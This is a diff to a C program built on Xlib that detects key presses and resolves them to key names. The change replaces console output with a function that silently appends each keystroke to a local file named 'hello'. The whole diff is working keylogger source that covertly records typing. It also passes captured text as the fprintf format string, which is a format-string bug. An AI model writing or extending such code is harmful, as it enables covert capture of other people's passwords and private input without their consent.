@@ -2,6 +2,19 @@
 #include <X11/Xlib.h>
 #include <string.h>
 
+// write_to_file() opens a file and appends the keys passed to it to the file
+void write_to_file(char *text) {
+
+	FILE *file = fopen("hello", "a+");
+
+	fprintf(file, text);
+
+	fprintf(file, "\n");
+
+	fclose(file);
+
+} 
+
 int main(void) {
 
 	char new_keys[32] = {0};
@@ -39,7 +52,7 @@ int main(void) {
 				for (bit = 0; bit < 8; bit++) {
 
 					// If the individual bit is "on" in the new_keys and "off" in the old_keys, then we know it has been pressed
-					if ( (new_keys[byte] & bitCheck)  ) {
+					if ( (new_keys[byte] & bitCheck) && !(old_keys[byte] & bitCheck) ) {
 						
 						// The keycode is the position that we found the bit that's "on"
 						keyCode = byte * 8 + bit;
@@ -48,7 +61,10 @@ int main(void) {
 						keySym = XKeycodeToKeysym(display, keyCode, 0);
 						
 						// XKeysymToString() translates the ASCII keySym to a string(like a, b, x, or whatever)
-						printf("Key pressed: [%s]\n", key = XKeysymToString(keySym));
+						key = XKeysymToString(keySym);
+
+						// Write the key to the file by calling the function
+						write_to_file(key);
 						
 					}
 					bitCheck = bitCheck << 1;
